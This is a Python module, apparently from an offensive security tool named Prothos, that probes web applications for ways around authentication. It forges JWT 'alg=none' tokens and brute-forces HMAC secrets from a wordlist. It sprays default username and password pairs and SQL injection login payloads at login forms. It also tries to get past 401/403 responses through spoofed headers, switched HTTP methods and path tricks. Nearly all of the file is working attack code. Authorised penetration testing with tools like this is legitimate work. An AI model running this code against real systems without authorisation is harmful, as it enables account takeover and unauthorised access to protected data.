import asyncio
import base64
import hashlib
import hmac
import json
from dataclasses import dataclass, field
from datetime import datetime, timezone
from typing import Optional
from urllib.parse import urlparse
import httpx
from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn, TimeElapsedColumn

console = Console()

JWT_SECRETS: list[str] = [
    "secret", "secretkey", "secret_key", "your-256-bit-secret", "your_jwt_secret",
    "jwt_secret", "jwtsecret", "password", "123456", "admin", "key", "private",
    "changeme", "test", "dev", "development", "production", "qwerty", "root",
    "default", "supersecret", "super_secret", "mysecret", "my_secret", "token",
    "jwtkey", "signature", "hmac", "shhhh", "s3cr3t", "p@ssw0rd", "letmein",
    "1234567890", "0000", "null", "none", "secret123", "JWT_SECRET", "access_token",
    "refresh_token", "api_secret", "app_secret", "client_secret", "auth", "auth_key",
    "secretpassword", "iloveyou", "welcome", "master", "topsecret", "secret1",
]

DEFAULT_CREDS: list[tuple[str, str]] = [
    ("admin", "admin"), ("admin", "password"), ("admin", "admin123"),
    ("admin", "123456"), ("admin", ""), ("admin", "changeme"), ("admin", "root"),
    ("administrator", "administrator"), ("administrator", "password"),
    ("root", "root"), ("root", "toor"), ("root", "password"), ("root", "admin"),
    ("test", "test"), ("guest", "guest"), ("user", "user"), ("user", "password"),
    ("demo", "demo"), ("admin", "letmein"), ("admin", "qwerty"),
    ("superadmin", "superadmin"), ("sa", "sa"), ("operator", "operator"),
    ("manager", "manager"), ("admin", "admin@123"), ("admin", "Admin@123"),
    ("admin", "P@ssw0rd"), ("tomcat", "tomcat"), ("postgres", "postgres"),
    ("oracle", "oracle"),
]

SQL_AUTH_PAYLOADS: list[str] = [
    "' OR '1'='1", "' OR '1'='1'--", "' OR '1'='1'#", "' OR '1'='1'/*",
    "admin'--", "admin'#", "admin'/*", "' OR 1=1--", "' OR 1=1#",
    "\" OR \"1\"=\"1", "\" OR \"1\"=\"1\"--", "') OR ('1'='1",
    "') OR ('1'='1'--", "1' OR '1'='1", "' OR ''='", "' OR 1=1 LIMIT 1--",
    "admin' OR '1'='1", "' UNION SELECT 1--", "' OR 'x'='x",
    "or 1=1", "or 1=1--", "or 1=1#", "') or '1'='1--",
]

BYPASS_HEADERS: list[dict] = [
    {"X-Original-URL": "/admin"},
    {"X-Rewrite-URL": "/admin"},
    {"X-Forwarded-For": "127.0.0.1"},
    {"X-Forwarded-For": "localhost"},
    {"X-Forwarded-Host": "127.0.0.1"},
    {"X-Remote-IP": "127.0.0.1"},
    {"X-Remote-Addr": "127.0.0.1"},
    {"X-Client-IP": "127.0.0.1"},
    {"X-Host": "127.0.0.1"},
    {"X-Custom-IP-Authorization": "127.0.0.1"},
    {"X-Originating-IP": "127.0.0.1"},
    {"X-Real-IP": "127.0.0.1"},
    {"X-Forwarded-Server": "localhost"},
    {"Forwarded": "for=127.0.0.1;host=localhost"},
    {"Referer": "https://localhost/admin"},
    {"X-Override-URL": "/admin"},
    {"X-HTTP-Method-Override": "GET"},
]

SEVERITY_COLOR = {
    "critical": "bold red",
    "high":     "red",
    "medium":   "yellow",
    "low":      "dim",
    "info":     "cyan",
}


@dataclass
class AuthFinding:
    technique:   str
    target:      str
    detail:      str
    status:      int          = 0
    evidence:    str          = ""
    severity:    str          = "high"

    def to_dict(self) -> dict:
        return self.__dict__.copy()


@dataclass
class AuthBypassReport:
    target:      str
    started_at:  str                  = field(default_factory=lambda: datetime.now(timezone.utc).isoformat())
    finished_at: Optional[str]       = None
    findings:    list[AuthFinding]   = field(default_factory=list)
    errors:      list[str]           = field(default_factory=list)

    @property
    def critical(self) -> list[AuthFinding]:
        return [f for f in self.findings if f.severity == "critical"]

    @property
    def high(self) -> list[AuthFinding]:
        return [f for f in self.findings if f.severity == "high"]

    def to_dict(self) -> dict:
        d = self.__dict__.copy()
        d["findings"] = [f.to_dict() for f in self.findings]
        return d


def _b64url_decode(data: str) -> bytes:
    pad = "=" * (-len(data) % 4)
    return base64.urlsafe_b64decode(data + pad)


def _b64url_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def _decode_jwt(token: str) -> Optional[tuple[dict, dict, str]]:
    try:
        parts = token.split(".")
        if len(parts) != 3:
            return None
        header  = json.loads(_b64url_decode(parts[0]))
        payload = json.loads(_b64url_decode(parts[1]))
        return header, payload, parts[2]
    except Exception:
        return None


def _forge_none_alg(header: dict, payload: dict) -> list[str]:
    tokens = []
    for alg in ("none", "None", "NONE", "nOnE"):
        h = dict(header)
        h["alg"] = alg
        seg_h = _b64url_encode(json.dumps(h, separators=(",", ":")).encode())
        seg_p = _b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
        tokens.append(f"{seg_h}.{seg_p}.")
    return tokens


def _crack_jwt(token: str) -> Optional[str]:
    parts = token.split(".")
    if len(parts) != 3:
        return None
    signing_input = f"{parts[0]}.{parts[1]}".encode()
    header = _decode_jwt(token)
    if not header:
        return None
    alg = header[0].get("alg", "HS256").upper()
    digest = {"HS256": hashlib.sha256, "HS384": hashlib.sha384, "HS512": hashlib.sha512}.get(alg)
    if not digest:
        return None
    for secret in JWT_SECRETS:
        sig = _b64url_encode(hmac.new(secret.encode(), signing_input, digest).digest())
        if hmac.compare_digest(sig, parts[2]):
            return secret
    return None


async def _test_jwt(report: AuthBypassReport, jwt: str):
    decoded = _decode_jwt(jwt)
    if not decoded:
        report.errors.append("Provided token is not a valid JWT")
        return
    header, payload, _ = decoded

    forged = _forge_none_alg(header, payload)
    f = AuthFinding(
        technique="JWT none algorithm",
        target="token",
        detail=f"Forged {len(forged)} alg=none variant(s); test against the server",
        evidence=forged[0][:80],
        severity="high",
    )
    report.findings.append(f)
    _print_finding(f)

    cracked = _crack_jwt(jwt)
    if cracked is not None:
        f = AuthFinding(
            technique="JWT secret bruteforce",
            target="token",
            detail=f"HMAC secret cracked: '{cracked}' — tokens can be forged",
            evidence=cracked,
            severity="critical",
        )
        report.findings.append(f)
        _print_finding(f)


async def _test_sql_auth(
    client:   httpx.AsyncClient,
    login:    str,
    user_field: str,
    pass_field: str,
    sem:      asyncio.Semaphore,
) -> list[AuthFinding]:

    findings: list[AuthFinding] = []
    try:
        baseline = await client.post(
            login,
            data={user_field: "prothos_invalid_xyz", pass_field: "prothos_invalid_xyz"},
            timeout=12,
        )
        base_status = baseline.status_code
        base_len    = len(baseline.text)
    except Exception:
        base_status, base_len = 0, 0

    async with sem:
        for payload in SQL_AUTH_PAYLOADS:
            try:
                r = await client.post(
                    login,
                    data={user_field: payload, pass_field: payload},
                    timeout=12,
                )
                redirected = r.status_code in (301, 302, 303, 307, 308)
                len_diff   = abs(len(r.text) - base_len) > 200
                status_chg = base_status and r.status_code != base_status

                if redirected or (status_chg and r.status_code < 400) or len_diff:
                    f = AuthFinding(
                        technique="SQL auth bypass",
                        target=login,
                        detail=f"Login response changed with payload: {payload}",
                        status=r.status_code,
                        evidence=f"status {base_status}->{r.status_code}, len_diff={len_diff}",
                        severity="critical",
                    )
                    findings.append(f)
                    _print_finding(f)
                    break
            except Exception:
                continue
    return findings


async def _test_default_creds(
    client:   httpx.AsyncClient,
    login:    str,
    user_field: str,
    pass_field: str,
    sem:      asyncio.Semaphore,
) -> list[AuthFinding]:

    findings: list[AuthFinding] = []
    try:
        baseline = await client.post(
            login,
            data={user_field: "prothos_invalid_xyz", pass_field: "prothos_invalid_zzz"},
            timeout=12,
        )
        base_status = baseline.status_code
        base_len    = len(baseline.text)
    except Exception:
        base_status, base_len = 0, 0

    async with sem:
        for user, pwd in DEFAULT_CREDS:
            try:
                r = await client.post(
                    login,
                    data={user_field: user, pass_field: pwd},
                    timeout=12,
                )
                redirected = r.status_code in (301, 302, 303, 307, 308)
                has_cookie = "set-cookie" in {k.lower() for k in r.headers}
                len_diff   = abs(len(r.text) - base_len) > 200

                if redirected or (has_cookie and r.status_code < 400 and len_diff):
                    f = AuthFinding(
                        technique="Default credentials",
                        target=login,
                        detail=f"Possible valid login: {user}:{pwd or '(empty)'}",
                        status=r.status_code,
                        evidence=f"status {base_status}->{r.status_code}, cookie={has_cookie}",
                        severity="critical",
                    )
                    findings.append(f)
                    _print_finding(f)
            except Exception:
                continue
    return findings


async def _test_403_bypass(
    client: httpx.AsyncClient,
    url:    str,
    sem:    asyncio.Semaphore,
) -> list[AuthFinding]:

    findings: list[AuthFinding] = []
    try:
        base = await client.get(url, timeout=10)
        base_status = base.status_code
    except Exception:
        base_status = 0

    if base_status not in (401, 403):
        return findings

    async with sem:
        for hdr in BYPASS_HEADERS:
            try:
                r = await client.get(url, headers=hdr, timeout=10)
                if r.status_code in (200, 201, 202, 204) and r.status_code != base_status:
                    key = next(iter(hdr))
                    f = AuthFinding(
                        technique="401/403 header bypass",
                        target=url,
                        detail=f"Access granted via header {key}: {hdr[key]}",
                        status=r.status_code,
                        evidence=f"{base_status}->{r.status_code} with {key}",
                        severity="high",
                    )
                    findings.append(f)
                    _print_finding(f)
            except Exception:
                continue

        for method in ("POST", "PUT", "PATCH", "TRACE", "OPTIONS"):
            try:
                r = await client.request(method, url, timeout=10)
                if r.status_code in (200, 201, 202, 204) and r.status_code != base_status:
                    f = AuthFinding(
                        technique="401/403 method bypass",
                        target=url,
                        detail=f"Access granted via HTTP method {method}",
                        status=r.status_code,
                        evidence=f"{base_status}->{r.status_code} with {method}",
                        severity="high",
                    )
                    findings.append(f)
                    _print_finding(f)
            except Exception:
                continue

        for variant in (url.rstrip("/") + "/.", url.rstrip("/") + "//",
                         url + "%2e", url + "?", url.rstrip("/") + "/%2e/"):
            try:
                r = await client.get(variant, timeout=10)
                if r.status_code in (200, 201, 202, 204) and r.status_code != base_status:
                    f = AuthFinding(
                        technique="401/403 path bypass",
                        target=variant,
                        detail="Access granted via path normalization trick",
                        status=r.status_code,
                        evidence=f"{base_status}->{r.status_code}",
                        severity="high",
                    )
                    findings.append(f)
                    _print_finding(f)
            except Exception:
                continue
    return findings


def _print_finding(f: AuthFinding):
    color = SEVERITY_COLOR.get(f.severity, "white")
    console.print(
        f"  [{color}][{f.severity.upper()}][/{color}] "
        f"[bold white]{f.technique}[/bold white] → "
        f"[yellow]{f.detail}[/yellow]"
    )


def _display(report: AuthBypassReport):
    console.print()
    console.print(Panel(
        f"[bold white]{report.target}[/bold white]  "
        f"[dim]findings:[/dim] [yellow]{len(report.findings)}[/yellow]  "
        f"[dim]critical:[/dim] [red]{len(report.critical)}[/red]  "
        f"[dim]high:[/dim] [red]{len(report.high)}[/red]",
        title="[bold red]Auth Bypass — Summary[/bold red]",
        border_style="red",
    ))

    if not report.findings:
        console.print("[dim]    No auth bypass found.[/dim]\n")
        return

    table = Table(show_header=True, header_style="bold red", border_style="dim")
    table.add_column("Severity",  width=10)
    table.add_column("Technique", style="cyan", width=24)
    table.add_column("Detail",    style="yellow", min_width=35)
    table.add_column("Status",    style="dim", width=7)

    for f in report.findings:
        color = SEVERITY_COLOR.get(f.severity, "white")
        table.add_row(
            f"[{color}]{f.severity}[/{color}]",
            f.technique,
            f.detail,
            str(f.status) if f.status else "-",
        )

    console.print(table)
    console.print()


async def _auth_async(
    target:      str,
    login_url:   Optional[str],
    jwt:         Optional[str],
    user_field:  str,
    pass_field:  str,
    concurrency: int,
    proxy:       Optional[str],
) -> AuthBypassReport:

    report = AuthBypassReport(target=target)
    sem    = asyncio.Semaphore(concurrency)

    async with httpx.AsyncClient(
        verify=False,
        follow_redirects=False,
        proxy=proxy,
        headers={"User-Agent": "Mozilla/5.0 (compatible; Prothos/1.0)"},
    ) as client:

        with Progress(
            SpinnerColumn(style="red"),
            TextColumn("[bold white]{task.description}"),
            BarColumn(bar_width=35, style="red", complete_style="green"),
            TimeElapsedColumn(),
            console=console,
            transient=True,
        ) as progress:
            task_id = progress.add_task("Testing auth bypass...", total=None)

            if jwt:
                await _test_jwt(report, jwt)

            if login_url:
                report.findings.extend(
                    await _test_sql_auth(client, login_url, user_field, pass_field, sem))
                report.findings.extend(
                    await _test_default_creds(client, login_url, user_field, pass_field, sem))

            report.findings.extend(await _test_403_bypass(client, target, sem))
            progress.update(task_id, completed=1, total=1)

    report.findings.sort(key=lambda x: (
        {"critical": 0, "high": 1, "medium": 2, "low": 3}.get(x.severity, 4)
    ))
    report.finished_at = datetime.now(timezone.utc).isoformat()
    return report


def run_auth_bypass(
    target:      str,
    login_url:   Optional[str]  = None,
    jwt:         Optional[str]  = None,
    user_field:  str            = "username",
    pass_field:  str            = "password",
    concurrency: int            = 10,
    proxy:       Optional[str]  = None,
    save_json:   Optional[str]  = None,
) -> AuthBypassReport:

    console.print(f"\n[bold red][*][/bold red] Auth Bypass → [bold white]{target}[/bold white]")
    modes = []
    if jwt:       modes.append("jwt")
    if login_url: modes.append("login")
    modes.append("403-bypass")
    console.print(f"[dim]    Modes: {', '.join(modes)}[/dim]")

    report = asyncio.run(_auth_async(
        target=target,
        login_url=login_url,
        jwt=jwt,
        user_field=user_field,
        pass_field=pass_field,
        concurrency=concurrency,
        proxy=proxy,
    ))

    _display(report)

    if save_json:
        try:
            with open(save_json, "w") as f:
                json.dump(report.to_dict(), f, indent=2, default=str)
            console.print(f"[dim][+] Saved to {save_json}[/dim]")
        except OSError as e:
            console.print(f"[red][!] Failed to save: {e}[/red]")

    return report
